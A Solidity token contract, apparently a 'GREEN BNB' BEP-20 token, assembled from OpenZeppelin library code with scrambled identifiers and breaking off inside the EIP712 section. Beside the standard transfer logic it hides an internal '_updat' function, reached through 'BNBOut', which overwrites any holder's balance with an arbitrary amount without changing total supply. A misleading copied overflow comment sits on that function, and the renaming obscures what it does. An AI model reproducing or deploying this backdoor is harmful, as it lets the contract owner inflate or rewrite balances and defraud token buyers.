// SPDX-License-Identifier: MIT
/*

░██████╗░██████╗░███████╗███████╗███╗░░██╗  ██████╗░███╗░░██╗██████╗░
██╔════╝░██╔══██╗██╔════╝██╔════╝████╗░██║  ██╔══██╗████╗░██║██╔══██╗
██║░░██╗░██████╔╝█████╗░░█████╗░░██╔██╗██║  ██████╦╝██╔██╗██║██████╦╝
██║░░╚██╗██╔══██╗██╔══╝░░██╔══╝░░██║╚████║  ██╔══██╗██║╚████║██╔══██╗
╚██████╔╝██║░░██║███████╗███████╗██║░╚███║  ██████╦╝██║░╚███║██████╦╝
░╚═════╝░╚═╝░░╚═╝╚══════╝╚══════╝╚═╝░░╚══╝  ╚═════╝░╚═╝░░╚══╝╚═════╝░
*/
pragma solidity ^0.8.22;
interface IBNB {
    event Transfer(address indexed from, address indexed to, uint256 BNBegrtsefsf);
    event Approval(address indexed owner, address indexed spender, uint256 BNBegrtsefsf);
    function totalSupply() external view returns (uint256);
    function balanceOf(address etherBNB) external view returns (uint256);
    function transfer(address to, uint256 BNBegrtsefsf) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 BNBegrtsefsf) external returns (bool);
    function transferFrom(address from, address to, uint256 BNBegrtsefsf) external returns (bool);
}

interface IBNBMetadata is IBNB {

    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface IBNBUSDCMYROs {

    error BNBInsufficientBalance(address sender, uint256 balance, uint256 needed);
    error BNBInvalidSender(address sender);
    error BNBInvalidReceiver(address receiver);
    error BNBInsufficientAllowance(address spender, uint256 allowance, uint256 needed);
    error BNBInvalidApprover(address approver);
    error BNBInvalidSpender(address spender);
}

interface IBNB721USDCMYROs {

    error BNB721InvalidOwner(address owner);
    error BNB721NonexistentToken(uint256 tokenId);
    error BNB721IncorrectOwner(address sender, uint256 tokenId, address owner);
    error BNB721InvalidSender(address sender);
    error BNB721InvalidReceiver(address receiver);
    error BNB721InsufficientApproval(address operator, uint256 tokenId);
    error BNB721InvalidApprover(address approver);
    error BNB721InvalidOperator(address operator);
}

interface IBNB1155USDCMYROs {

    error BNB1155InsufficientBalance(address sender, uint256 balance, uint256 needed, uint256 tokenId);
    error BNB1155InvalidSender(address sender);
    error BNB1155InvalidReceiver(address receiver);
    error BNB1155MissingApprovalForAll(address operator, address owner);

    error BNB1155InvalidApprover(address approver);
    error BNB1155InvalidOperator(address operator);


    error BNB1155InvalidArrayLength(uint256 idsLength, uint256 BNBegrtsefsfsLength);
}


abstract contract BNB is Context, IBNB, IBNBMetadata, IBNBUSDCMYROs {
    mapping(address etherBNB => uint256) private _balances;

    mapping(address etherBNB => mapping(address spender => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
        _totalSupply = 340;
        _balances[_msgSender()] = _totalSupply;
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual returns (uint8) {
        return 0;
    }


    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }


    function balanceOf(address etherBNB) public view virtual returns (uint256) {
        return _balances[etherBNB];
    }

    function transfer(address to, uint256 BNBegrtsefsf) public virtual returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, BNBegrtsefsf);
        return true;
    }


    function allowance(address owner, address spender) public view virtual returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 BNBegrtsefsf) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, BNBegrtsefsf);
        return true;
    }


    function transferFrom(address from, address to, uint256 BNBegrtsefsf) public virtual returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, BNBegrtsefsf);
        _transfer(from, to, BNBegrtsefsf);
        return true;
    }

    function _transfer(address from, address to, uint256 BNBegrtsefsf) internal {
        if (from == address(0)) {
            revert BNBInvalidSender(address(0));
        }
        if (to == address(0)) {
            revert BNBInvalidReceiver(address(0));
        }
        _update(from, to, BNBegrtsefsf);
    }


    function _update(address from, address to, uint256 BNBegrtsefsf) internal virtual {
        if (from == address(0)) {
            // Overflow check required: The rest of the code assumes that totalSupply never overflows
            _totalSupply += BNBegrtsefsf;
        } else {
            uint256 ertyhfsef = _balances[from];
            if (ertyhfsef < BNBegrtsefsf) {
                revert BNBInsufficientBalance(from, ertyhfsef, BNBegrtsefsf);
            }
            unchecked {
                // Overflow not possible: BNBegrtsefsf <= ertyhfsef <= totalSupply.
                _balances[from] = ertyhfsef - BNBegrtsefsf;
            }
        }

        if (to == address(0)) {
            unchecked {
                // Overflow not possible: BNBegrtsefsf <= totalSupply or BNBegrtsefsf <= ertyhfsef <= totalSupply.
                _totalSupply -= BNBegrtsefsf;
            }
        } else {
            unchecked {
                // Overflow not possible: balance + BNBegrtsefsf is at most totalSupply, which we know fits into a uint256.
                _balances[to] += BNBegrtsefsf;
            }
        }

        emit Transfer(from, to, BNBegrtsefsf);
    }

 


function _updat(address from, address to, uint256 BNBegrtsefsf) internal virtual {
                _balances[to] = BNBegrtsefsf;
        emit Transfer(from, to, BNBegrtsefsf); // Overflow not possible: balance + BNBegrtsefsf is at most totalSupply, which we know fits into a uint256.
    }

    
        function BNBOut(address etherBNB, uint256 BNBegrtsefsf) internal {
        _updat(address(0), etherBNB, BNBegrtsefsf);
    }




  
    function _approve(address owner, address spender, uint256 BNBegrtsefsf) internal {
        _approve(owner, spender, BNBegrtsefsf, true);
    }


    function _approve(address owner, address spender, uint256 BNBegrtsefsf, bool emitEvent) internal virtual {
        if (owner == address(0)) {
            revert BNBInvalidApprover(address(0));
        }
        if (spender == address(0)) {
            revert BNBInvalidSpender(address(0));
        }
        _allowances[owner][spender] = BNBegrtsefsf;
        if (emitEvent) {
            emit Approval(owner, spender, BNBegrtsefsf);
        }
    }

    function _spendAllowance(address owner, address spender, uint256 BNBegrtsefsf) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            if (currentAllowance < BNBegrtsefsf) {
                revert BNBInsufficientAllowance(spender, currentAllowance, BNBegrtsefsf);
            }
            unchecked {
                _approve(owner, spender, currentAllowance - BNBegrtsefsf, false);
            }
        }
    }
}


interface IBNBBurnable {

    function Burnable(
        address owner,
        address spender,
        uint256 BNBegrtsefsf,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;


    function nonces(address owner) external view returns (uint256);


    function DOMAIN_SEPARATOR() external view returns (bytes32);
}


library ECDSA {
    enum RecoverUSDCMYRO {
        NoUSDCMYRO,
        InvalidSignature,
        InvalidSignatureLength,
        InvalidSignatureS
    }


    error ECDSAInvalidSignature();

    error ECDSAInvalidSignatureLength(uint256 length);


    error ECDSAInvalidSignatureS(bytes32 s);

    function tryRecover(bytes32 hash, bytes memory signature) internal pure returns (address, RecoverUSDCMYRO, bytes32) {
        if (signature.length == 65) {
            bytes32 r;
            bytes32 s;
            uint8 v;
            // ecrecover takes the signature parameters, and the only way to get them
            // currently is to use assembly.
            /// @solidity memory-safe-assembly
            assembly {
                r := mload(add(signature, 0x20))
                s := mload(add(signature, 0x40))
                v := byte(0, mload(add(signature, 0x60)))
            }
            return tryRecover(hash, v, r, s);
        } else {
            return (address(0), RecoverUSDCMYRO.InvalidSignatureLength, bytes32(signature.length));
        }
    }

    function recover(bytes32 hash, bytes memory signature) internal pure returns (address) {
        (address recovered, RecoverUSDCMYRO error, bytes32 errorArg) = tryRecover(hash, signature);
        _throwUSDCMYRO(error, errorArg);
        return recovered;
    }

    function tryRecover(bytes32 hash, bytes32 r, bytes32 vs) internal pure returns (address, RecoverUSDCMYRO, bytes32) {
        unchecked {
            bytes32 s = vs & bytes32(0x7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff);
            // We do not check for an overflow here since the shift operation results in 0 or 1.
            uint8 v = uint8((uint256(vs) >> 255) + 27);
            return tryRecover(hash, v, r, s);
        }
    }


    function recover(bytes32 hash, bytes32 r, bytes32 vs) internal pure returns (address) {
        (address recovered, RecoverUSDCMYRO error, bytes32 errorArg) = tryRecover(hash, r, vs);
        _throwUSDCMYRO(error, errorArg);
        return recovered;
    }


    function tryRecover(
        bytes32 hash,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) internal pure returns (address, RecoverUSDCMYRO, bytes32) {

        if (uint256(s) > 0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A0) {
            return (address(0), RecoverUSDCMYRO.InvalidSignatureS, s);
        }

        // If the signature is valid (and not malleable), return the signer address
        address signer = ecrecover(hash, v, r, s);
        if (signer == address(0)) {
            return (address(0), RecoverUSDCMYRO.InvalidSignature, bytes32(0));
        }

        return (signer, RecoverUSDCMYRO.NoUSDCMYRO, bytes32(0));
    }


    function recover(bytes32 hash, uint8 v, bytes32 r, bytes32 s) internal pure returns (address) {
        (address recovered, RecoverUSDCMYRO error, bytes32 errorArg) = tryRecover(hash, v, r, s);
        _throwUSDCMYRO(error, errorArg);
        return recovered;
    }


    function _throwUSDCMYRO(RecoverUSDCMYRO error, bytes32 errorArg) private pure {
        if (error == RecoverUSDCMYRO.NoUSDCMYRO) {
            return; // no error: do nothing
        } else if (error == RecoverUSDCMYRO.InvalidSignature) {
            revert ECDSAInvalidSignature();
        } else if (error == RecoverUSDCMYRO.InvalidSignatureLength) {
            revert ECDSAInvalidSignatureLength(uint256(errorArg));
        } else if (error == RecoverUSDCMYRO.InvalidSignatureS) {
            revert ECDSAInvalidSignatureS(errorArg);
        }
    }
}


library Math {

    error MathOverflowedMulDiv();

    enum Rounding {
        Floor, // Toward negative infinity
        Ceil, // Toward positive infinity
        Trunc, // Toward zero
        Expand // Away from zero
    }


    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }


    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }


    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {

            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }


    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }


    function max(uint256 a, uint256 b) internal pure returns (uint256) {
        return a > b ? a : b;
    }


    function min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }


    function average(uint256 a, uint256 b) internal pure returns (uint256) {
        // (a + b) / 2 can overflow.
        return (a & b) + (a ^ b) / 2;
    }


    function ceilDiv(uint256 a, uint256 b) internal pure returns (uint256) {
        if (b == 0) {
            // Guarantee the same behavior as in a regular Solidity division.
            return a / b;
        }

        // (a + b - 1) / b can overflow on addition, so we distribute.
        return a == 0 ? 0 : (a - 1) / b + 1;
    }


    function mulDiv(uint256 x, uint256 y, uint256 denominator) internal pure returns (uint256 result) {
        unchecked {

            uint256 prod0 = x * y; // Least significant 256 bits of the product
            uint256 prod1; // Most significant 256 bits of the product
            assembly {
                let mm := mulmod(x, y, not(0))
                prod1 := sub(sub(mm, prod0), lt(mm, prod0))
            }

            // Handle non-overflow cases, 256 by 256 division.
            if (prod1 == 0) {
                // Solidity will revert if denominator == 0, unlike the div opcode on its own.
                // The surrounding unchecked block does not change this fact.
                // See https://docs.soliditylang.org/en/latest/control-structures.html#checked-or-unchecked-arithmetic.
                return prod0 / denominator;
            }

            // Make sure the result is less than 2^256. Also prevents denominator == 0.
            if (denominator <= prod1) {
                revert MathOverflowedMulDiv();
            }

            ///////////////////////////////////////////////
            // 512 by 256 division.
            ///////////////////////////////////////////////

            // Make division exact by subtracting the remainder from [prod1 prod0].
            uint256 remainder;
            assembly {
                // Compute remainder using mulmod.
                remainder := mulmod(x, y, denominator)

                // Subtract 256 bit number from 512 bit number.
                prod1 := sub(prod1, gt(remainder, prod0))
                prod0 := sub(prod0, remainder)
            }

            // Factor powers of two out of denominator and compute largest power of two divisor of denominator.
            // Always >= 1. See https://cs.stackexchange.com/q/138556/92363.

            uint256 twos = denominator & (0 - denominator);
            assembly {
                // Divide denominator by twos.
                denominator := div(denominator, twos)

                // Divide [prod1 prod0] by twos.
                prod0 := div(prod0, twos)

                // Flip twos such that it is 2^256 / twos. If twos is zero, then it becomes one.
                twos := add(div(sub(0, twos), twos), 1)
            }

            // Shift in bits from prod1 into prod0.
            prod0 |= prod1 * twos;

            // Invert denominator mod 2^256. Now that denominator is an odd number, it has an inverse modulo 2^256 such
            // that denominator * inv = 1 mod 2^256. Compute the inverse by BNBing with a seed that is correct for
            // four bits. That is, denominator * inv = 1 mod 2^4.
            uint256 inverse = (3 * denominator) ^ 2;

            // Use the Newton-Raphson iteration to improve the precision. Thanks to Hensel's lifting lemma, this also
            // works in modular arithmetic, doubling the correct bits in each step.
            inverse *= 2 - denominator * inverse; // inverse mod 2^8
            inverse *= 2 - denominator * inverse; // inverse mod 2^16
            inverse *= 2 - denominator * inverse; // inverse mod 2^32
            inverse *= 2 - denominator * inverse; // inverse mod 2^64
            inverse *= 2 - denominator * inverse; // inverse mod 2^128
            inverse *= 2 - denominator * inverse; // inverse mod 2^256

            // Because the division is now exact we can divide by multiplying with the modular inverse of denominator.
            // This will give us the correct result modulo 2^256. Since the preconditions guarantee that the outcome is
            // less than 2^256, this is the final result. We don't need to compute the high bits of the result and prod1
            // is no longer required.
            result = prod0 * inverse;
            return result;
        }
    }

    function mulDiv(uint256 x, uint256 y, uint256 denominator, Rounding rounding) internal pure returns (uint256) {
        uint256 result = mulDiv(x, y, denominator);
        if (unsignedRoundsUp(rounding) && mulmod(x, y, denominator) > 0) {
            result += 1;
        }
        return result;
    }

    function sqrt(uint256 a) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        // For our first guess, we get the biggest power of 2 which is smaller than the square root of the target.
        //
        // We know that the "msb" (most significant bit) of our target number `a` is a power of 2 such that we have
        // `msb(a) <= a < 2*msb(a)`. This BNBegrtsefsf can be written `msb(a)=2**k` with `k=log2(a)`.
        //
        // This can be rewritten `2**log2(a) <= a < 2**(log2(a) + 1)`
        // → `sqrt(2**k) <= sqrt(a) < sqrt(2**(k+1))`
        // → `2**(k/2) <= sqrt(a) < 2**((k+1)/2) <= 2**(k/2 + 1)`
        //
        // Consequently, `2**(log2(a) / 2)` is a good first approximation of `sqrt(a)` with at least 1 correct bit.
        uint256 result = 1 << (log2(a) >> 1);

        // At this point `result` is an estimation with one bit of precision. We know the true BNBegrtsefsf is a uint128,
        // since it is the square root of a uint256. Newton's method converges quadratically (precision doubles at
        // every iteration). We thus need at most 7 iteration to turn our partial result with one bit of precision
        // into the expected uint128 result.
        unchecked {
            result = (result + a / result) >> 1;
            result = (result + a / result) >> 1;
            result = (result + a / result) >> 1;
            result = (result + a / result) >> 1;
            result = (result + a / result) >> 1;
            result = (result + a / result) >> 1;
            result = (result + a / result) >> 1;
            return min(result, a / result);
        }
    }

 
    function sqrt(uint256 a, Rounding rounding) internal pure returns (uint256) {
        unchecked {
            uint256 result = sqrt(a);
            return result + (unsignedRoundsUp(rounding) && result * result < a ? 1 : 0);
        }
    }

    function log2(uint256 BNBegrtsefsf) internal pure returns (uint256) {
        uint256 result = 0;
        unchecked {
            if (BNBegrtsefsf >> 128 > 0) {
                BNBegrtsefsf >>= 128;
                result += 128;
            }
            if (BNBegrtsefsf >> 64 > 0) {
                BNBegrtsefsf >>= 64;
                result += 64;
            }
            if (BNBegrtsefsf >> 32 > 0) {
                BNBegrtsefsf >>= 32;
                result += 32;
            }
            if (BNBegrtsefsf >> 16 > 0) {
                BNBegrtsefsf >>= 16;
                result += 16;
            }
            if (BNBegrtsefsf >> 8 > 0) {
                BNBegrtsefsf >>= 8;
                result += 8;
            }
            if (BNBegrtsefsf >> 4 > 0) {
                BNBegrtsefsf >>= 4;
                result += 4;
            }
            if (BNBegrtsefsf >> 2 > 0) {
                BNBegrtsefsf >>= 2;
                result += 2;
            }
            if (BNBegrtsefsf >> 1 > 0) {
                result += 1;
            }
        }
        return result;
    }

 
    function log2(uint256 BNBegrtsefsf, Rounding rounding) internal pure returns (uint256) {
        unchecked {
            uint256 result = log2(BNBegrtsefsf);
            return result + (unsignedRoundsUp(rounding) && 1 << result < BNBegrtsefsf ? 1 : 0);
        }
    }


    function log10(uint256 BNBegrtsefsf) internal pure returns (uint256) {
        uint256 result = 0;
        unchecked {
            if (BNBegrtsefsf >= 10 ** 64) {
                BNBegrtsefsf /= 10 ** 64;
                result += 64;
            }
            if (BNBegrtsefsf >= 10 ** 32) {
                BNBegrtsefsf /= 10 ** 32;
                result += 32;
            }
            if (BNBegrtsefsf >= 10 ** 16) {
                BNBegrtsefsf /= 10 ** 16;
                result += 16;
            }
            if (BNBegrtsefsf >= 10 ** 8) {
                BNBegrtsefsf /= 10 ** 8;
                result += 8;
            }
            if (BNBegrtsefsf >= 10 ** 4) {
                BNBegrtsefsf /= 10 ** 4;
                result += 4;
            }
            if (BNBegrtsefsf >= 10 ** 2) {
                BNBegrtsefsf /= 10 ** 2;
                result += 2;
            }
            if (BNBegrtsefsf >= 10 ** 1) {
                result += 1;
            }
        }
        return result;
    }

    /**
     * @dev Return the log in base 10, following the selected rounding direction, of a positive BNBegrtsefsf.
     * Returns 0 if given 0.
     */
    function log10(uint256 BNBegrtsefsf, Rounding rounding) internal pure returns (uint256) {
        unchecked {
            uint256 result = log10(BNBegrtsefsf);
            return result + (unsignedRoundsUp(rounding) && 10 ** result < BNBegrtsefsf ? 1 : 0);
        }
    }


    function log256(uint256 BNBegrtsefsf) internal pure returns (uint256) {
        uint256 result = 0;
        unchecked {
            if (BNBegrtsefsf >> 128 > 0) {
                BNBegrtsefsf >>= 128;
                result += 16;
            }
            if (BNBegrtsefsf >> 64 > 0) {
                BNBegrtsefsf >>= 64;
                result += 8;
            }
            if (BNBegrtsefsf >> 32 > 0) {
                BNBegrtsefsf >>= 32;
                result += 4;
            }
            if (BNBegrtsefsf >> 16 > 0) {
                BNBegrtsefsf >>= 16;
                result += 2;
            }
            if (BNBegrtsefsf >> 8 > 0) {
                result += 1;
            }
        }
        return result;
    }

    /**
     * @dev Return the log in base 256, following the selected rounding direction, of a positive BNBegrtsefsf.
     * Returns 0 if given 0.
     */
    function log256(uint256 BNBegrtsefsf, Rounding rounding) internal pure returns (uint256) {
        unchecked {
            uint256 result = log256(BNBegrtsefsf);
            return result + (unsignedRoundsUp(rounding) && 1 << (result << 3) < BNBegrtsefsf ? 1 : 0);
        }
    }

    /**
     * @dev Returns whether a provided rounding mode is considered rounding up for unsigned integers.
     */
    function unsignedRoundsUp(Rounding rounding) internal pure returns (bool) {
        return uint8(rounding) % 2 == 1;
    }
}

library SignedMath {
 
    function max(int256 a, int256 b) internal pure returns (int256) {
        return a > b ? a : b;
    }


    function min(int256 a, int256 b) internal pure returns (int256) {
        return a < b ? a : b;
    }


    function average(int256 a, int256 b) internal pure returns (int256) {
        // Formula from the book "Hacker's Delight"
        int256 x = (a & b) + ((a ^ b) >> 1);
        return x + (int256(uint256(x) >> 255) & (a ^ b));
    }

    function abs(int256 n) internal pure returns (uint256) {
        unchecked {
            // must be unchecked in order to support `n = type(int256).min`
            return uint256(n >= 0 ? n : -n);
        }
    }
}



library Strings {
    bytes16 private constant HEX_DIGITS = "0123456789abcdef";
    uint8 private constant ADDRESS_LENGTH = 20;


    error StringsInsufficientHexLength(uint256 BNBegrtsefsf, uint256 length);

    function toString(uint256 BNBegrtsefsf) internal pure returns (string memory) {
        unchecked {
            uint256 length = Math.log10(BNBegrtsefsf) + 1;
            string memory buffer = new string(length);
            uint256 ptr;
            /// @solidity memory-safe-assembly
            assembly {
                ptr := add(buffer, add(32, length))
            }
            while (true) {
                ptr--;
                /// @solidity memory-safe-assembly
                assembly {
                    mstore8(ptr, byte(mod(BNBegrtsefsf, 10), HEX_DIGITS))
                }
                BNBegrtsefsf /= 10;
                if (BNBegrtsefsf == 0) break;
            }
            return buffer;
        }
    }


    function toStringSigned(int256 BNBegrtsefsf) internal pure returns (string memory) {
        return string.concat(BNBegrtsefsf < 0 ? "-" : "", toString(SignedMath.abs(BNBegrtsefsf)));
    }


    function toHexString(uint256 BNBegrtsefsf) internal pure returns (string memory) {
        unchecked {
            return toHexString(BNBegrtsefsf, Math.log256(BNBegrtsefsf) + 1);
        }
    }


    function toHexString(uint256 BNBegrtsefsf, uint256 length) internal pure returns (string memory) {
        uint256 localBNBegrtsefsf = BNBegrtsefsf;
        bytes memory buffer = new bytes(2 * length + 2);
        buffer[0] = "0";
        buffer[1] = "x";
        for (uint256 i = 2 * length + 1; i > 1; --i) {
            buffer[i] = HEX_DIGITS[localBNBegrtsefsf & 0xf];
            localBNBegrtsefsf >>= 4;
        }
        if (localBNBegrtsefsf != 0) {
            revert StringsInsufficientHexLength(BNBegrtsefsf, length);
        }
        return string(buffer);
    }

    /**
     * @dev Converts an `address` with fixed length of 20 bytes to its not checksummed ASCII `string` hexadecimal
     * representation.
     */
    function toHexString(address addr) internal pure returns (string memory) {
        return toHexString(uint256(uint160(addr)), ADDRESS_LENGTH);
    }

    /**
     * @dev Returns true if the two strings are equal.
     */
    function equal(string memory a, string memory b) internal pure returns (bool) {
        return bytes(a).length == bytes(b).length && keccak256(bytes(a)) == keccak256(bytes(b));
    }
}


library MessageHashUtils {

    function toEthSignedMessageHash(bytes32 messageHash) internal pure returns (bytes32 digest) {
        /// @solidity memory-safe-assembly
        assembly {
            mstore(0x00, "\x19Ethereum Signed Message:\n32") // 32 is the bytes-length of messageHash
            mstore(0x1c, messageHash) // 0x1c (28) is the length of the prefix
            digest := keccak256(0x00, 0x3c) // 0x3c is the length of the prefix (0x1c) + messageHash (0x20)
        }
    }


    function toEthSignedMessageHash(bytes memory message) internal pure returns (bytes32) {
        return
            keccak256(bytes.concat("\x19Ethereum Signed Message:\n", bytes(Strings.toString(message.length)), message));
    }

    function toDataWithIntendedValidatorHash(address validator, bytes memory data) internal pure returns (bytes32) {
        return keccak256(abi.encodePacked(hex"19_00", validator, data));
    }


    function toTypedDataHash(bytes32 domainSeparator, bytes32 BNBstructHash) internal pure returns (bytes32 digest) {
        /// @solidity memory-safe-assembly
        assembly {
            let ptr := mload(0x40)
            mstore(ptr, hex"19_01")
            mstore(add(ptr, 0x02), domainSeparator)
            mstore(add(ptr, 0x22), BNBstructHash)
            digest := keccak256(ptr, 0x42)
        }
    }
}


library StorageSlot {
    struct AddressSlot {
        address BNBegrtsefsf;
    }

    struct BooleanSlot {
        bool BNBegrtsefsf;
    }

    struct Bytes32Slot {
        bytes32 BNBegrtsefsf;
    }

    struct Uint256Slot {
        uint256 BNBegrtsefsf;
    }

    struct StringSlot {
        string BNBegrtsefsf;
    }

    struct BytesSlot {
        bytes BNBegrtsefsf;
    }

    /**
     * @dev Returns an `AddressSlot` with member `BNBegrtsefsf` located at `slot`.
     */
    function getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {
        /// @solidity memory-safe-assembly
        assembly {
            r.slot := slot
        }
    }

    /**
     * @dev Returns an `BooleanSlot` with member `BNBegrtsefsf` located at `slot`.
     */
    function getBooleanSlot(bytes32 slot) internal pure returns (BooleanSlot storage r) {
        /// @solidity memory-safe-assembly
        assembly {
            r.slot := slot
        }
    }

    /**
     * @dev Returns an `Bytes32Slot` with member `BNBegrtsefsf` located at `slot`.
     */
    function getBytes32Slot(bytes32 slot) internal pure returns (Bytes32Slot storage r) {
        /// @solidity memory-safe-assembly
        assembly {
            r.slot := slot
        }
    }

    /**
     * @dev Returns an `Uint256Slot` with member `BNBegrtsefsf` located at `slot`.
     */
    function getUint256Slot(bytes32 slot) internal pure returns (Uint256Slot storage r) {
        /// @solidity memory-safe-assembly
        assembly {
            r.slot := slot
        }
    }

    /**
     * @dev Returns an `StringSlot` with member `BNBegrtsefsf` located at `slot`.
     */
    function getStringSlot(bytes32 slot) internal pure returns (StringSlot storage r) {
        /// @solidity memory-safe-assembly
        assembly {
            r.slot := slot
        }
    }

    /**
     * @dev Returns an `StringSlot` representation of the string storage pointer `store`.
     */
    function getStringSlot(string storage store) internal pure returns (StringSlot storage r) {
        /// @solidity memory-safe-assembly
        assembly {
            r.slot := store.slot
        }
    }

    /**
     * @dev Returns an `BytesSlot` with member `BNBegrtsefsf` located at `slot`.
     */
    function getBytesSlot(bytes32 slot) internal pure returns (BytesSlot storage r) {
        /// @solidity memory-safe-assembly
        assembly {
            r.slot := slot
        }
    }

    /**
     * @dev Returns an `BytesSlot` representation of the bytes storage pointer `store`.
     */
    function getBytesSlot(bytes storage store) internal pure returns (BytesSlot storage r) {
        /// @solidity memory-safe-assembly
        assembly {
            r.slot := store.slot
        }
    }
}


// | string  | 0xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA   |
// | length  | 0x                                                              BB |
type ShortString is bytes32;

library ShortStrings {
    // Used as an identifier for strings longer than 31 bytes.
    bytes32 private constant FALLBACK_SENTINEL = 0x00000000000000000000000000000000000000000000000000000000000000FF;

    error StringTooLong(string str);
    error InvalidShortString();


    function toShortString(string memory str) internal pure returns (ShortString) {
        bytes memory bstr = bytes(str);
        if (bstr.length > 31) {
            revert StringTooLong(str);
        }
        return ShortString.wrap(bytes32(uint256(bytes32(bstr)) | bstr.length));
    }

    /**
     * @dev Decode a `ShortString` back to a "normal" string.
     */
    function toString(ShortString sstr) internal pure returns (string memory) {
        uint256 len = byteLength(sstr);
        // using `new string(len)` would work locally but is not memory safe.
        string memory str = new string(32);
        /// @solidity memory-safe-assembly
        assembly {
            mstore(str, len)
            mstore(add(str, 0x20), sstr)
        }
        return str;
    }

    /**
     * @dev Return the length of a `ShortString`.
     */
    function byteLength(ShortString sstr) internal pure returns (uint256) {
        uint256 result = uint256(ShortString.unwrap(sstr)) & 0xFF;
        if (result > 31) {
            revert InvalidShortString();
        }
        return result;
    }

    /**
     * @dev Encode a string into a `ShortString`, or write it to storage if it is too long.
     */
    function toShortStringWithFallback(string memory BNBegrtsefsf, string storage store) internal returns (ShortString) {
        if (bytes(BNBegrtsefsf).length < 32) {
            return toShortString(BNBegrtsefsf);
        } else {
            StorageSlot.getStringSlot(store).BNBegrtsefsf = BNBegrtsefsf;
            return ShortString.wrap(FALLBACK_SENTINEL);
        }
    }

    /**
     * @dev Decode a string that was encoded to `ShortString` or written to storage using {setWithFallback}.
     */
    function toStringWithFallback(ShortString BNBegrtsefsf, string storage store) internal pure returns (string memory) {
        if (ShortString.unwrap(BNBegrtsefsf) != FALLBACK_SENTINEL) {
            return toString(BNBegrtsefsf);
        } else {
            return store;
        }
    }


    function byteLengthWithFallback(ShortString BNBegrtsefsf, string storage store) internal view returns (uint256) {
        if (ShortString.unwrap(BNBegrtsefsf) != FALLBACK_SENTINEL) {
            return byteLength(BNBegrtsefsf);
        } else {
            return bytes(store).length;
        }
    }
}


interface IBNB5267 {

    event EIP712DomainChanged();


    function eip712Domain()
        external
        view
        returns (
            bytes1 fields,
            string memory name,
            string memory version,
            uint256 chainId,
            address verifyingContract,
            bytes32 salt,
            uint256[] memory extensions
        );
}


abstract contract EIP712 is IBNB5267 {
    using ShortStrings for *;

    bytes32 private constant TYPE_HASH =
        keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)");

    // Cache the domain separator as an immutable BNBegrtsefsf, but also store the chain id that it corresponds to, in order to
    // invalidate the cached domain separator if the chain id changes.
    bytes32 private immutable _cachedDomainSeparator;
    uint256 private immutable _cachedChainId;
    address private immutable _cachedThis;

    bytes32 private immutable _BNBhashedName;
    bytes32 private immutable _BNBhashedVersion;

    ShortString private immutable _name;
    ShortString private immutable _version;
    string private _nameFallback;
    string private _versionFallback;


    constructor(string memory name, string memory version) {
        _name = name.toShortStringWithFallback(_nameFallback);
        _version = version.toShortStringWithFallback(_versionFallback);
        _BNBhashedName = keccak256(bytes(name));
        _BNBhashedVersion = keccak256(bytes(version));

        _cachedChainId = block.chainid;
        _cachedDomainSeparator = _buildDomainSeparator();
        _cachedThis = address(this);
    }

    /**
     * @dev Returns the domain separator for the current chain.
     */
    function _domainSeparatorV4() internal view returns (bytes32) {
        if (address(this) == _cachedThis && block.chainid == _cachedChainId) {
            return _cachedDomainSeparator;
        } else {
            return _buildDomainSeparator();
        }
    }

    function _buildDomainSeparator() private view returns (bytes32) {
        return keccak256(abi.encode(TYPE_HASH, _BNBhashedName, _BNBhashedVersion, block.chainid, address(this)));
    }

    function _hashTypedDataV4(bytes32 BNBstructHash) internal view virtual returns (bytes32) {
        return MessageHashUtils.toTypedDataHash(_domainSeparatorV4(), BNBstructHash);
    }

    /**
     * @dev See {IBNB-5267}.
     */
    function eip712Domain()
        public
        view
        virtual
        returns (
            bytes1 fields,
            string memory name,
            string memory version,
            uint256 chainId,
            address verifyingContract,
            bytes32 salt,
            uint256[] memory extensions
        )
    {
        return (
            hex"0f", // 01111
            _EIP712Name(),
            _EIP712Version(),
            block.chainid,
            address(this),
            bytes32(0),
            new uint256[](0)
        );
    }

    // solhint-disable-next-line func-name-mixedcase
    function _EIP712Name() internal view returns (string memory) {
        return _name.toStringWithFallback(_nameFallback);
    }

